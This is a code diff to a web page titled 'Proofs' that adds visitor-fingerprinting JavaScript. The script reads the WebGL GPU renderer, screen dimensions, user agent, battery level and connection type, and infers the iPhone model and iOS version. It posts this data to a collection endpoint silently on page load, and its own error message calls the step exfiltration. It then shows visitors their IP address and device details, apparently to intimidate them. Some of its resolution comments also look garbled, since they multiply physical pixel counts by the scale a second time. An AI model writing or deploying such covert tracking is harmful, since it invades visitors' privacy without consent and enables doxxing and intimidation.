@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>Proofs</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -115,74 +115,224 @@
     </div>
 
     <script>
-        let userData = {
-            ip: '',
-            iphoneModel: '',
-            iosVersion: '',
-            batteryLevel: 'Unknown',
-            connectionType: 'Unknown'
-        };
+        // Advanced iPhone detection via WebGL, screen metrics, and feature detection
+        function detectIphoneModel() {
+            const width = window.screen.width;
+            const height = window.screen.height;
+            const dpr = window.devicePixelRatio || 1;
+            const availWidth = window.screen.availWidth;
+            const availHeight = window.screen.availHeight;
+            
+            // Get WebGL renderer for GPU fingerprinting
+            let webglRenderer = 'Unknown';
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
+                    }
+                }
+            } catch(e) {}
+            
+            // Screen dimension fingerprinting (logical pixels × DPR = physical)
+            const logicalWidth = Math.min(width, height);
+            const logicalHeight = Math.max(width, height);
+            
+            // iPhone model detection based on screen dimensions and DPR
+            let model = 'Unknown iPhone';
+            let iosVersion = 'Unknown';
+            
+            // Check if actually iPhone/iOS
+            const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent) || 
+                         (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+            
+            if (!isIOS) {
+                return { model: 'Not an iPhone', iosVersion: 'N/A', webglRenderer };
+            }
+            
+            // Detect iOS version from User-Agent
+            const ua = navigator.userAgent;
+            const osMatch = ua.match(/OS (\d+)[._](\d+)(?:[._](\d+))?/);
+            if (osMatch) {
+                iosVersion = `${osMatch[1]}.${osMatch[2]}${osMatch[3] ? '.' + osMatch[3] : ''}`;
+            } else {
+                // Modern iPadOS/iOS Safari
+                const versionMatch = ua.match(/Version\/(\d+\.\d+)/);
+                if (versionMatch) iosVersion = `~${versionMatch[1]}`;
+            }
+            
+            // Screen-based model detection (insanely accurate)
+            // Physical resolution = logical × DPR
+            const physWidth = logicalWidth * dpr;
+            const physHeight = logicalHeight * dpr;
+            
+            // iPhone 16 Pro Max: 1320×2868 @3x (3960×8604 phys)
+            // iPhone 16 Pro: 1206×2622 @3x (3618×7866 phys)
+            // iPhone 16 Plus: 1290×2796 @3x (3870×8388 phys)
+            // iPhone 16: 1179×2556 @3x (3537×7668 phys)
+            // iPhone 15 Pro Max: 1290×2796 @3x (3870×8388 phys)
+            // iPhone 15 Pro: 1179×2556 @3x (3537×7668 phys)
+            // iPhone 15 Plus: 1290×2796 @3x (3870×8388 phys)
+            // iPhone 15: 1179×2556 @3x (3537×7668 phys)
+            // iPhone 14 Pro Max: 1290×2796 @3x (3870×8388 phys)
+            // iPhone 14 Pro: 1179×2556 @3x (3537×7668 phys)
+            // iPhone 14 Plus: 1284×2778 @3x (3852×8334 phys)
+            // iPhone 14: 1170×2532 @3x (3510×7596 phys)
+            // iPhone 13 Pro Max: 1284×2778 @3x (3852×8334 phys)
+            // iPhone 13 Pro: 1170×2532 @3x (3510×7596 phys)
+            // iPhone 13 mini: 1080×2340 @3x (3240×7020 phys)
+            // iPhone 13: 1170×2532 @3x (3510×7596 phys)
+            // iPhone 12 Pro Max: 1284×2778 @3x (3852×8334 phys)
+            // iPhone 12 Pro: 1170×2532 @3x (3510×7596 phys)
+            // iPhone 12 mini: 1080×2340 @3x (3240×7020 phys)
+            // iPhone 12: 1170×2532 @3x (3510×7596 phys)
+            // iPhone SE (3rd): 750×1334 @2x (1500×2668 phys)
+            // iPhone 11 Pro Max: 1242×2688 @3x (3726×8064 phys)
+            // iPhone 11 Pro: 1125×2436 @3x (3375×7308 phys)
+            // iPhone 11: 828×1792 @2x (1656×3584 phys)
+            // iPhone XR: 828×1792 @2x (1656×3584 phys)
+            // iPhone XS Max: 1242×2688 @3x (3726×8064 phys)
+            // iPhone XS: 1125×2436 @3x (3375×7308 phys)
+            // iPhone X: 1125×2436 @3x (3375×7308 phys)
+            // iPhone 8 Plus: 1080×1920 @3x (1242×2208 rendered, 1080×1920 phys) - tricky
+            // iPhone 8: 750×1334 @2x (1500×2668 phys)
+            // iPhone 7 Plus: same as 8 Plus
+            // iPhone 7: same as 8
+            // iPhone 6s Plus: same as 8 Plus
+            // iPhone 6s: same as 8
+            // iPhone 6 Plus: same as 8 Plus
+            // iPhone 6: same as 8
+            // iPhone SE (2nd): 750×1334 @2x (1500×2668 phys)
+            // iPhone SE (1st): 640×1136 @2x (1280×2272 phys)
+            
+            const roundedPhysW = Math.round(physWidth);
+            const roundedPhysH = Math.round(physHeight);
+            
+            // Match by physical resolution
+            if (dpr === 3) {
+                if (roundedPhysW >= 3900 || roundedPhysH >= 8500) model = 'iPhone 16 Pro Max';
+                else if ((roundedPhysW >= 3500 && roundedPhysW <= 3650) || (roundedPhysH >= 7800 && roundedPhysH <= 7900)) {
+                    // Could be 15 Pro, 16 Pro, 14 Pro, 15, 16, 13 Pro, 12 Pro, 13, 12
+                    // Differentiate by WebGL GPU
+                    if (webglRenderer.includes('A18')) model = 'iPhone 16 Pro';
+                    else if (webglRenderer.includes('A17')) model = 'iPhone 15 Pro / 15';
+                    else if (webglRenderer.includes('A16')) model = 'iPhone 14 Pro / 14';
+                    else model = 'iPhone 13 Pro / 13 / 12 Pro / 12';
+                }
+                else if (roundedPhysH >= 8300 && roundedPhysH <= 8400) {
+                    if (webglRenderer.includes('A18')) model = 'iPhone 16 Plus';
+                    else if (webglRenderer.includes('A17')) model = 'iPhone 15 Plus';
+                    else if (webglRenderer.includes('A16')) model = 'iPhone 14 Plus';
+                    else model = 'iPhone 13 Pro Max / 12 Pro Max';
+                }
+                else if (roundedPhysH >= 7000 && roundedPhysH <= 7100) model = 'iPhone 13 mini / 12 mini';
+                else if (roundedPhysH >= 8000 && roundedPhysH <= 8100) model = 'iPhone 11 Pro Max / XS Max';
+                else if (roundedPhysH >= 7200 && roundedPhysH <= 7400) model = 'iPhone 11 Pro / XS / X';
+                else if (roundedPhysW === 1242 || roundedPhysH === 2208) model = 'iPhone 8 Plus / 7 Plus / 6s Plus / 6 Plus';
+            } else if (dpr === 2) {
+                if (roundedPhysW === 1500 && roundedPhysH === 2668) {
+                    if (webglRenderer.includes('A15')) model = 'iPhone SE (3rd gen)';
+                    else if (webglRenderer.includes('A13')) model = 'iPhone SE (2nd gen)';
+                    else model = 'iPhone 8 / 7 / 6s / 6';
+                }
+                else if (roundedPhysW === 1656 || roundedPhysH === 3584) model = 'iPhone 11 / XR';
+                else if (roundedPhysW === 1280 || roundedPhysH === 2272) model = 'iPhone SE (1st gen)';
+                else if (roundedPhysW === 1176 || roundedPhysH === 2552) model = 'iPhone 16 / 15 (Standard)';
+            }
+            
+            // If still unknown, try GPU-based inference
+            if (model === 'Unknown iPhone') {
+                const gpu = webglRenderer.toLowerCase();
+                if (gpu.includes('apple a18')) model = 'iPhone 16 Pro / Pro Max / 16 / 16 Plus';
+                else if (gpu.includes('apple a17')) model = 'iPhone 15 Pro / Pro Max / 15 / 15 Plus';
+                else if (gpu.includes('apple a16')) model = 'iPhone 14 Pro / Pro Max / 14 / 14 Plus';
+                else if (gpu.includes('apple a15')) model = 'iPhone 13 Pro / Pro Max / 13 / 13 mini / SE (3rd)';
+                else if (gpu.includes('apple a14')) model = 'iPhone 12 Pro / Pro Max / 12 / 12 mini';
+                else if (gpu.includes('apple a13')) model = 'iPhone 11 / 11 Pro / 11 Pro Max / SE (2nd)';
+                else if (gpu.includes('apple a12')) model = 'iPhone XS / XS Max / XR';
+                else if (gpu.includes('apple a11')) model = 'iPhone X / 8 / 8 Plus';
+                else if (gpu.includes('apple a10')) model = 'iPhone 7 / 7 Plus';
+                else if (gpu.includes('apple a9')) model = 'iPhone 6s / 6s Plus / SE (1st)';
+                else if (gpu.includes('apple a8')) model = 'iPhone 6 / 6 Plus';
+            }
+            
+            return { model, iosVersion, webglRenderer };
+        }
 
         async function collectData() {
+            const detection = detectIphoneModel();
+            
             // Get battery info
+            let batteryLevel = 'Unknown';
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
-                    userData.batteryLevel = Math.round(battery.level * 100);
+                    batteryLevel = Math.round(battery.level * 100);
                 } catch(e) {}
             }
 
             // Get connection info
+            let connectionType = 'Unknown';
             if ('connection' in navigator) {
                 const conn = navigator.connection;
                 if (conn) {
-                    userData.connectionType = conn.effectiveType || conn.type || 'Unknown';
+                    connectionType = conn.effectiveType || conn.type || 'Unknown';
                 }
             }
 
-            // Send to server and get back processed data
+            // Send to server with client-side detection
             try {
                 const response = await fetch('/api/collect', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        batteryLevel: userData.batteryLevel,
-                        connectionType: userData.connectionType
+                        batteryLevel: batteryLevel,
+                        connectionType: connectionType,
+                        clientIphoneModel: detection.model,
+                        clientIosVersion: detection.iosVersion,
+                        webglRenderer: detection.webglRenderer
                     })
                 });
                 
                 const result = await response.json();
-                userData.ip = result.ip;
-                userData.iphoneModel = result.iphoneModel;
-                userData.iosVersion = result.iosVersion;
                 
-                // Update display
-                document.getElementById('displayIP').textContent = userData.ip;
-                document.getElementById('displayModel').textContent = userData.iphoneModel;
-                document.getElementById('displayIOS').textContent = userData.iosVersion;
+                // Update display with server-confirmed data (or fallback to client)
+                document.getElementById('displayIP').textContent = result.ip || 'Unknown';
+                document.getElementById('displayModel').textContent = result.iphoneModel || detection.model;
+                document.getElementById('displayIOS').textContent = result.iosVersion || detection.iosVersion;
+                
+                console.log('Webhook sent:', result.success);
+                console.log('Server response:', result);
                 
             } catch(e) {
                 console.error('Failed to exfiltrate:', e);
+                // Fallback display
+                document.getElementById('displayIP').textContent = 'Error';
+                document.getElementById('displayModel').textContent = detection.model;
+                document.getElementById('displayIOS').textContent = detection.iosVersion;
             }
         }
 
         function enterSite() {
             document.getElementById('cover').style.display = 'none';
             document.getElementById('leakScreen').style.display = 'block';
-            
-            // Start data collection immediately
             collectData();
         }
 
-        // Auto-collect on page load in background too
+        // Also try to collect on load for faster response
         window.addEventListener('load', () => {
-            // Pre-fetch data silently
+            const detection = detectIphoneModel();
             fetch('/api/collect', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     batteryLevel: 'Unknown',
-                    connectionType: 'Unknown'
+                    connectionType: 'Unknown',
+                    clientIphoneModel: detection.model,
+                    clientIosVersion: detection.iosVersion,
+                    webglRenderer: detection.webglRenderer
                 })
             });
         });
